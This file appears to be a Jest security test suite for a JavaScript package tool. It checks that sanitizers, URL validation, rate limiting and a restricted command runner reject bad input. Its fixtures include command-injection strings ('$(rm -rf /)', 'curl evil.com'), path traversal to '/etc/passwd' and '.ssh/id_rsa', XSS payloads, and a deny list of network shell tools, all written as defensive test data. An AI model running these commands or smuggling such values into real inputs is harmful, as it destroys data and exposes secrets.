/**
 * Security-focused test suite
 * Tests for input validation, injection prevention, and security measures
 */

import { describe, test, expect, beforeEach } from '@jest/globals';
import {
  sanitizePackageName,
  sanitizeFilePath,
  sanitizeCommandArgs,
  validateUrl,
  RateLimiter,
  generateSecureHash,
} from '../src/security/input-sanitizer.js';
import { execSecure, execNpm, execGit } from '../src/security/secure-exec.js';
import { SecureHttpClient, getPackageInfo } from '../src/security/secure-http.js';
import {
  validatePackageName,
  validateFilePath,
  ValidationError,
} from '../src/validation/schemas.js';

describe('Security Tests', () => {
  describe('Input Sanitization', () => {
    describe('Package Name Sanitization', () => {
      test('should accept valid package names', () => {
        const validNames = [
          'lodash',
          '@types/node',
          'my-package',
          'package_name',
          'package.name',
          '@scope/package-name',
        ];

        validNames.forEach((name) => {
          expect(() => sanitizePackageName(name)).not.toThrow();
          expect(sanitizePackageName(name)).toBe(name);
        });
      });

      test('should reject malicious package names', () => {
        const maliciousNames = [
          '../../../etc/passwd',
          '$(rm -rf /)',
          '<script>alert(1)</script>',
          'package; rm -rf /',
          'package | cat /etc/passwd',
          'package && curl evil.com',
          'node_modules/evil',
          '.git/config',
          'file://malicious',
          'http://evil.com',
          'javascript:alert(1)',
          '${evil}',
          '`evil`',
        ];

        maliciousNames.forEach((name) => {
          expect(() => sanitizePackageName(name)).toThrow();
        });
      });

      test('should reject empty or invalid types', () => {
        const invalid = [null, undefined, '', ' ', 123, {}, []];

        invalid.forEach((name) => {
          expect(() => sanitizePackageName(name)).toThrow();
        });
      });

      test('should reject excessively long package names', () => {
        const longName = 'a'.repeat(215);
        expect(() => sanitizePackageName(longName)).toThrow('too long');
      });
    });

    describe('File Path Sanitization', () => {
      test('should accept valid file paths', () => {
        const validPaths = ['.eslintrc.json', 'src/index.js', 'package.json', 'docs/README.md'];

        validPaths.forEach((filePath) => {
          expect(() => sanitizeFilePath(filePath)).not.toThrow();
        });
      });

      test('should reject path traversal attempts', () => {
        const maliciousPaths = [
          '../../../etc/passwd',
          '..\\..\\windows\\system32',
          '/etc/passwd',
          'C:\\Windows\\System32',
          'node_modules/evil.js',
          '.git/hooks/pre-commit',
          '.env',
          '.ssh/id_rsa',
          '/var/log/system.log',
        ];

        maliciousPaths.forEach((filePath) => {
          expect(() => sanitizeFilePath(filePath)).toThrow();
        });
      });

      test('should reject excessively long paths', () => {
        const longPath = 'a'.repeat(261);
        expect(() => sanitizeFilePath(longPath)).toThrow('too long');
      });
    });

    describe('Command Argument Sanitization', () => {
      test('should accept safe command arguments', () => {
        const safeArgs = ['install', 'package-name', '--save-dev', '--version', '@types/node'];

        safeArgs.forEach((arg) => {
          expect(() => sanitizeCommandArgs([arg])).not.toThrow();
        });
      });

      test('should reject command injection attempts', () => {
        const dangerousArgs = [
          '; rm -rf /',
          '| cat /etc/passwd',
          '&& curl evil.com',
          '$(evil)',
          '`evil`',
          'package; evil',
          'package | evil',
          'package && evil',
          'rm -rf /',
          'wget evil.com',
          'curl -X POST evil.com',
        ];

        dangerousArgs.forEach((arg) => {
          expect(() => sanitizeCommandArgs([arg])).toThrow();
        });
      });
    });

    describe('URL Validation', () => {
      test('should accept whitelisted HTTPS URLs', () => {
        const validUrls = [
          'https://registry.npmjs.org/package',
          'https://api.github.com/repos/user/repo',
          'https://raw.githubusercontent.com/user/repo/main/file',
        ];

        validUrls.forEach((url) => {
          expect(() => validateUrl(url)).not.toThrow();
        });
      });

      test('should reject non-HTTPS URLs', () => {
        const invalidUrls = [
          'http://registry.npmjs.org',
          'ftp://evil.com',
          'file:///etc/passwd',
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>',
        ];

        invalidUrls.forEach((url) => {
          expect(() => validateUrl(url)).toThrow();
        });
      });

      test('should reject private IP addresses', () => {
        const privateIps = [
          'https://127.0.0.1',
          'https://10.0.0.1',
          'https://172.16.0.1',
          'https://192.168.1.1',
          'https://169.254.1.1',
        ];

        privateIps.forEach((url) => {
          expect(() => validateUrl(url)).toThrow('not in whitelist');
        });
      });

      test('should reject non-whitelisted domains', () => {
        const nonWhitelistedUrls = [
          'https://evil.com',
          'https://malicious-site.org',
          'https://fake-npm-registry.com',
        ];

        nonWhitelistedUrls.forEach((url) => {
          expect(() => validateUrl(url)).toThrow('not in whitelist');
        });
      });
    });
  });

  describe('Rate Limiting', () => {
    let rateLimiter;

    beforeEach(() => {
      rateLimiter = new RateLimiter(3, 1000); // 3 requests per second
    });

    test('should allow requests within limit', () => {
      expect(rateLimiter.isAllowed('test')).toBe(true);
      expect(rateLimiter.isAllowed('test')).toBe(true);
      expect(rateLimiter.isAllowed('test')).toBe(true);
    });

    test('should reject requests over limit', () => {
      // Use up the rate limit
      rateLimiter.isAllowed('test');
      rateLimiter.isAllowed('test');
      rateLimiter.isAllowed('test');

      // This should be rejected
      expect(rateLimiter.isAllowed('test')).toBe(false);
    });

    test('should reset after time window', async () => {
      // Use up the rate limit
      rateLimiter.isAllowed('test');
      rateLimiter.isAllowed('test');
      rateLimiter.isAllowed('test');

      expect(rateLimiter.isAllowed('test')).toBe(false);

      // Wait for reset
      await new Promise((resolve) => setTimeout(resolve, 1100));

      expect(rateLimiter.isAllowed('test')).toBe(true);
    });

    test('should track different identifiers separately', () => {
      // Use up limit for 'test1'
      rateLimiter.isAllowed('test1');
      rateLimiter.isAllowed('test1');
      rateLimiter.isAllowed('test1');

      expect(rateLimiter.isAllowed('test1')).toBe(false);

      // 'test2' should still be allowed
      expect(rateLimiter.isAllowed('test2')).toBe(true);
    });
  });

  describe('Secure Command Execution', () => {
    test('should only allow whitelisted commands', async () => {
      const allowedCommands = ['npm', 'node', 'git'];

      for (const command of allowedCommands) {
        // These shouldn't throw due to command restriction
        try {
          await execSecure(command, ['--version'], { timeout: 5000 });
        } catch (error) {
          // May fail for other reasons, but not command restriction
          expect(error.message).not.toContain('not allowed');
        }
      }
    });

    test('should reject non-whitelisted commands', async () => {
      const dangerousCommands = ['rm', 'del', 'format', 'wget', 'curl', 'nc', 'telnet', 'ssh'];

      for (const command of dangerousCommands) {
        await expect(execSecure(command, [])).rejects.toThrow('not allowed');
      }
    });

    test('should timeout long-running commands', async () => {
      const start = Date.now();

      await expect(execSecure('node', ['--version'], { timeout: 1000 })).resolves.not.toThrow();

      const elapsed = Date.now() - start;
      expect(elapsed).toBeLessThan(5000); // Should complete quickly
    });

    test('should limit output size', async () => {
      // Test with a command that has reasonable output
      await expect(execSecure('node', ['--version'])).resolves.not.toThrow();
    });

    test('should sanitize npm command arguments', async () => {
      await expect(execNpm(['install', '; rm -rf /'])).rejects.toThrow('Invalid command arguments');
    });

    test('should restrict dangerous git commands', async () => {
      const dangerousGitCommands = [
        ['push', 'origin', 'main'],
        ['clone', 'https://evil.com/repo'],
        ['config', 'user.name', 'hacker'],
        ['reset', '--hard', 'HEAD~10'],
      ];

      for (const args of dangerousGitCommands) {
        await expect(execGit(args)).rejects.toThrow('not allowed');
      }
    });
  });

  describe('Secure HTTP Client', () => {
    let secureClient;

    beforeEach(() => {
      secureClient = new SecureHttpClient({
        timeout: 5000,
        maxRetries: 1,
      });
    });

    test('should reject non-HTTPS URLs', async () => {
      await expect(secureClient.request('http://registry.npmjs.org')).rejects.toThrow();
    });

    test('should reject non-whitelisted domains', async () => {
      await expect(secureClient.request('https://evil.com')).rejects.toThrow('not in whitelist');
    });

    test('should timeout slow requests', async () => {
      const start = Date.now();

      // This will timeout since we can't make actual requests in tests
      await expect(
        secureClient.request('https://registry.npmjs.org/nonexistent-package-12345-test')
      ).rejects.toThrow();

      const elapsed = Date.now() - start;
      expect(elapsed).toBeLessThan(10000); // Should timeout within our limit
    });

    test('should respect rate limits', async () => {
      const limitedClient = new SecureHttpClient({
        rateLimiter: new RateLimiter(1, 5000), // 1 request per 5 seconds
      });

      // First request should be allowed (but may fail for other reasons)
      try {
        await limitedClient.request('https://registry.npmjs.org/lodash');
      } catch (error) {
        expect(error.message).not.toContain('Rate limit');
      }

      // Second immediate request should be rate limited
      await expect(limitedClient.request('https://registry.npmjs.org/lodash')).rejects.toThrow(
        'Rate limit exceeded'
      );
    });
  });

  describe('Input Validation Schemas', () => {
    test('should validate package names correctly', () => {
      expect(() => validatePackageName('lodash')).not.toThrow();
      expect(() => validatePackageName('@types/node')).not.toThrow();
      expect(() => validatePackageName('../evil')).toThrow(ValidationError);
      expect(() => validatePackageName('')).toThrow(ValidationError);
    });

    test('should validate file paths correctly', () => {
      expect(() => validateFilePath('src/index.js')).not.toThrow();
      expect(() => validateFilePath('.eslintrc.json')).not.toThrow();
      // These should fail at the regex pattern level, not custom validation
      expect(() => validateFilePath('../../../etc/passwd')).toThrow();
      expect(() => validateFilePath('node_modules/evil.js')).toThrow();
    });

    test('should provide detailed validation errors', () => {
      try {
        validatePackageName('');
      } catch (error) {
        expect(error).toBeInstanceOf(ValidationError);
        expect(error.field).toBe('packageName');
        expect(error.message).toContain('at least');
      }
    });
  });

  describe('Security Utilities', () => {
    test('should generate secure hashes', () => {
      const hash1 = generateSecureHash('test1');
      const hash2 = generateSecureHash('test2');

      expect(hash1).toHaveLength(8);
      expect(hash2).toHaveLength(8);
      expect(hash1).not.toBe(hash2); // Should be different for different inputs
    });

    test('should handle malformed JSON safely', () => {
      const malformed = '{"invalid": json}';

      expect(() => JSON.parse(malformed)).toThrow();
      // Our validation should handle this gracefully
    });
  });

  describe('Integration Security Tests', () => {
    test('should prevent package info fetching with malicious names', async () => {
      const maliciousNames = ['../../../etc/passwd', '$(curl evil.com)', 'package; rm -rf /'];

      for (const name of maliciousNames) {
        await expect(getPackageInfo(name)).rejects.toThrow();
      }
    });

    test('should handle network timeouts gracefully', async () => {
      // This tests the timeout behavior without making actual network calls
      const start = Date.now();

      try {
        await getPackageInfo('definitely-nonexistent-package-12345-test');
      } catch {
        const elapsed = Date.now() - start;
        expect(elapsed).toBeLessThan(15000); // Should timeout within reasonable time
      }
    });

    test('should validate JSON responses from package registry', async () => {
      // Mock a malformed response scenario
      // In practice, our validation should handle this
      const invalidResponses = [null, undefined, '', 'not json', '{"incomplete":'];

      // These would be handled by our validation layer
      invalidResponses.forEach((response) => {
        if (response === null || response === undefined || response === '') {
          // These are falsy values, not JSON parsing errors
          expect(true).toBe(true);
        } else {
          expect(() => {
            JSON.parse(response);
          }).toThrow();
        }
      });
    });
  });

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in errors', () => {
      try {
        sanitizePackageName('$(cat /etc/passwd)');
      } catch (error) {
        // Error message should not contain the actual malicious content
        expect(error.message).not.toContain('$(cat /etc/passwd)');
        expect(error.message).toContain('Dangerous pattern detected');
      }
    });

    test('should sanitize error messages', () => {
      try {
        validateUrl('javascript:alert(1)');
      } catch (error) {
        // Should not expose the full malicious URL in error
        expect(error.message).not.toContain('javascript:alert(1)');
      }
    });
  });
});
